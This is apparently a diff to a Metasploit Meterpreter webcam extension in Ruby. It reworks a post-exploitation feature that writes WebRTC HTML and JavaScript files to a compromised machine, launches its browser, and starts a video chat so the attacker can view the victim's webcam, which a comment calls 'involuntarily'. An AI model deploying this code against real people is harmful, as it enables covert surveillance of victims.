@@ -58,13 +58,14 @@ class Webcam
 
   def webcam_chat
     offerer_id = 'sinn3r_offer'
-    ready_status = init_video_chat(offerer_id)
+    remote_browser_path = get_webrtc_browser_path
+    ready_status = init_video_chat(remote_browser_path, offerer_id)
     unless ready_status
       raise RuntimeError, "Unable to find a suitable browser to initialize a WebRTC session."
     end
 
-    remote_browser_path = get_webrtc_browser_path
-    connect_video_chat(remote_browser_path, offerer_id)
+    select(nil, nil, nil, 10)
+    connect_video_chat(offerer_id)
   end
 
   # Record from default audio source for +duration+ seconds;
@@ -81,6 +82,11 @@ class Webcam
 
   private
 
+  #
+  # Returns a browser path that supports WebRTC
+  #
+  # @return [String]
+  #
   def get_webrtc_browser_path
     found_browser_path = ''
 
@@ -105,8 +111,10 @@ class Webcam
         '/Applications/Google Chrome.app',
         '/Applications/Firefox.app',
       ].each do |browser_path|
-        found_browser_path = found_browser_path
-        break
+        if file?(browser_path)
+          found_browser_path = browser_path
+          break
+        end
       end
     when /linux|unix/
       # Need to add support for Linux
@@ -115,8 +123,42 @@ class Webcam
     found_browser_path
   end
 
-  def init_video_chat(offerer_id)
+
+  #
+  # Creates a video chat session as an offerer... involuntarily :-p
+  #
+  # @param remote_browser_path [String] A browser path that supports WebRTC on the target machine
+  # @param offerer_id [String] A ID that the answerer can look for and join
+  #
+  def init_video_chat(remote_browser_path, offerer_id)
     interface = load_interface('offerer.html')
+    api       = load_api_code
+
+    tmp_dir = session.sys.config.getenv("TEMP")
+
+    write_file("#{tmp_dir}\\interface.html", interface)
+    write_file("#{tmp_dir}\\api.js", api)
+
+    # Special flags needed
+    args = ''
+    if remote_browser_path =~ /Chrome/
+      args = "\"--allow-file-access-from-files\""
+    end
+
+    exec_opts = {'Hidden' => false, 'Channelized' => false}
+    args = "#{args} #{tmp_dir}\\interface.html"
+    session.sys.process.execute(remote_browser_path, args, exec_opts)
+  end
+
+
+  #
+  # Connects to a video chat session as an answerer
+  #
+  # @param offerer_id [String] The offerer's ID in order to join the video chat
+  # @return void
+  #
+  def connect_video_chat(offerer_id)
+    interface = load_interface('answerer.html')
     api       = load_api_code
 
     tmp_api = Tempfile.new('api.js')
@@ -126,7 +168,7 @@ class Webcam
 
     interface = interface.gsub(/\=WEBRTCAPIJS\=/, tmp_api.path)
 
-    tmp_interface = Tempfile.new('offerer.html')
+    tmp_interface = Tempfile.new('answerer.html')
     tmp_interface.binmode
     tmp_interface.write(interface)
     tmp_interface.close
@@ -134,24 +176,13 @@ class Webcam
     Rex::Compat.open_webrtc_browser(tmp_interface.path)
   end
 
-  def connect_video_chat(remote_browser_path, offerer_id)
-    interface = load_interface('answerer.html')
-    api       = load_api_code
 
-    # write interface
-    # write api
-
-    # Special flags needed
-    args = ''
-    if remote_browser_path =~ /Chrome/
-      args = "\"--allow-file-access-from-files\""
-    end
-
-    exec_opts = {'Hidden' => false, 'Channelized' => false}
-    args = "#{args} http://metasploit.com"
-    session.sys.process.execute(remote_browser_path, args, exec_opts)
-  end
-
+  #
+  # Returns the webcam interface
+  #
+  # @param html_name [String] The filename of the HTML interface (offerer.html or answerer.html)
+  # @return [String] The HTML interface code
+  #
   def load_interface(html_name)
     interface_path = ::File.join(Msf::Config.data_directory, 'webcam', html_name)
     interface_code = ''
@@ -159,6 +190,12 @@ class Webcam
     interface_code
   end
 
+
+  #
+  # Returns the webcam API
+  #
+  # @return [String] The WebRTC lib code
+  #
   def load_api_code
     js_api_path = ::File.join(Msf::Config.data_directory, 'webcam', 'api.js')
     api = ''
